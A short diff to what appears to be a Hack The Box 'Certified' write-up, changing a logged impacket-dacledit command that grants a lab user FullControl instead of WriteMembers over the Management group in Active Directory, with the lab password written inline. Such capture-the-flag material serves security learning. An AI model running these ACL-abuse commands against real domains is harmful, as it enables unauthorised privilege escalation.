@@ -438,7 +438,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 ```bash
 kali@Kali [23時31分54秒] [~/HTB/Certified] 
--> % impacket-dacledit -action "write" -rights "WriteMembers" -principal "judith.mader" -target-dn "CN=Management,CN=Users,DC=certified,DC=htb" certified.htb/judith.mader:judith09
+-> % impacket-dacledit -action "write" -rights "FullControl" -principal "judith.mader" -target "Management" certified.htb/judith.mader:judith09
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] DACL backed up to dacledit-20241104-233847.bak
